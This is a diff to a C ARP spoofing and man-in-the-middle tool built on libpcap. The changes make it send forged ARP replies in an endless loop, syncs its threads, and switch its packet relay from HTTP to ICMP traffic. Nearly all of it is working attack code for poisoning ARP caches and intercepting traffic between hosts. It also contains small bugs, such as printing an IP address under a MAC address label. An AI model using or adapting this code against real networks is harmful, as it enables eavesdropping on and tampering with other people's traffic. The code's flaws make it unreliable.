@@ -23,7 +23,8 @@
 
 pthread_t *threads;
 __thread byte tg_packet[MAX_PACKET];
-
+pthread_mutex_t  gmutex = PTHREAD_MUTEX_INITIALIZER; //sync
+pthread_cond_t gcond = PTHREAD_COND_INITIALIZER;
 
 /*
  *  send_arp
@@ -129,8 +130,12 @@ normal_arp (
 
     send_arp(handle, &eh, &ah, &ad);
     puts("send Normal ARP Requset...");
-    if(!recv_arp(handle, (byte*)tmac)) return 1;
+    if(!recv_arp(handle, (byte*)tmac)) {
+	puts("Success to get MAC Address");
+	return 1;
+    }
 
+    puts("Failed to get MAC Address");
     return 0;
 }
 
@@ -170,8 +175,14 @@ arp_infection (
     memcpy(&ad.target_ha, ether_aton(smac), ETHER_ADDR_LEN);
     ad.target_ip = inet_addr(sip);
 
-    printf("Send Infect ARP Reply...\n");
-    send_arp(handle, &eh, &ah, &ad);
+    while(1) {
+	pthread_mutex_lock(&gmutex);
+	printf("The thread continues to send infect arp reply....\n");
+	send_arp(handle, &eh, &ah, &ad);
+	pthread_cond_signal(&gcond);
+	pthread_mutex_unlock(&gmutex);
+	sleep(3);
+    }
 }
 
 /*
@@ -181,6 +192,8 @@ arp_infection (
  */
 
 #define Packet_Len(x)	(((pipv4_hdr)x)->ip_len)+14
+#define Filter		"icmp"
+
 int
 packet_relay (
 	pcap_t *handle,
@@ -189,7 +202,7 @@ packet_relay (
     //ether_hdr eh;
 
     struct bpf_program fp;		    /* The compiled filter */
-    byte filter_exp[] = "port 80";	    /* The fileter expression */
+    byte filter_exp[] = Filter;		    /* The fileter expression */
     bpf_u_int32 net = 0;		    /* Our IP */
     struct pcap_pkthdr header;		    /* The header that pcap gives us */
     const u_char *packet;		    /* The actual packet */
@@ -205,24 +218,23 @@ packet_relay (
 	fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
 	return(0);
     }
-
+    
     while(1) {
 	puts("MITM...");
 	if(pcap_next_ex(handle, (struct pcap_pkthdr **)&header, &packet) == 1) {
-	    dumpcode(packet, 0x50);
 	    packet_ptr = packet;
 
 	    if(((pether_hdr)packet_ptr)->ether_type == htons(ETHERTYPE_IP)) {
 		packet_ptr += ETHER_SIZE;
 		header_len = ETHER_SIZE;
 
-		if(((pipv4_hdr)packet_ptr)->ip_p == IPPROTO_TCP) {
+		if(((pipv4_hdr)packet_ptr)->ip_p == IPPROTO_ICMP) {
 		    total_len = Packet_Len(packet_ptr);
 		    header_len += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);
 		    packet_ptr += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);
 
-		    dumpcode(packet, total_len+14);
-		    if(((ptcp_hdr)packet_ptr)->th_dport == htons(80)) {
+		    /*
+		    if(((ptcp_hdr)packet_ptr)->th_dport == 80) {
 			header_len += ((((ptcp_hdr)packet_ptr)->th_off)*4);
 			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);
 	
@@ -234,7 +246,7 @@ packet_relay (
 
 			dumpcode(tg_packet+header_len, total_len-header_len);
 			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
-		    } else if(((ptcp_hdr)packet_ptr)->th_sport == htons(80)) {
+		    } else if(((ptcp_hdr)packet_ptr)->th_sport == 80) {
 			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);
 
 			// relay to sender from target
@@ -245,7 +257,7 @@ packet_relay (
 
 			dumpcode(tg_packet+header_len, total_len-header_len);
 			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
-		    } else continue;
+		    } else continue; */
 		}
 	    }
 	}
@@ -374,8 +386,10 @@ arp_spoof (
 		(const byte*)t_al->ip)) 
     {
 	puts("===== ARP Request Result ====");
+	printf("Sender's IP  Address : %s\n", s_al->ip);
 	printf("Sender's MAC Address : %s\n", s_al->mac);
 	puts("=============================");
+	printf("Target's MAC Address : %s\n", t_al->ip);
 	printf("Target's MAC Address : %s\n", t_al->mac);
 	puts("=============================");
 
@@ -393,7 +407,7 @@ arp_spoof (
 		(const byte*)t_al->ip);
 
 	//relay
-	packet_relay(handle, my_al);
+	//packet_relay(handle, my_al);
     }
 
     return ((void *)0);
@@ -459,19 +473,23 @@ main (
     p_ta = (thr_arg*) malloc(sizeof(thr_arg)*gen_num);
     memset(p_ta, 0, sizeof(thr_arg)*gen_num);
 
+    pthread_mutex_lock(&gmutex);
     for(DWORD i=0; i<gen_num; i++) {
 	p_ta[i].handle = handle;
 	p_ta[i].my_al = &my_al;
 	p_ta[i].s_al = &s_al[i];
 	p_ta[i].t_al = &t_al[i];
 
-	pthread_create(&threads[i], NULL, &arp_spoof, (void *)&p_ta[i]);
-	//pthread_detach(threads[i]);
+	if(pthread_create(&threads[i], NULL, &arp_spoof, (void *)&p_ta[i]) < 0) {
+	    printf("pthread_create error\n");
+	    return -1;
+	}
+	pthread_detach(threads[i]);
     }
-
-    // Wait for multiple threads
-    for(DWORD i=0; i<gen_num; i++)
-	pthread_join(threads[i], (void *)&status);
+     
+    pthread_cond_wait(&gcond, &gmutex); //block
+    pthread_mutex_unlock(&gmutex);
+    packet_relay(handle, &my_al);
 
     /* And close the session */
     pcap_close(handle);
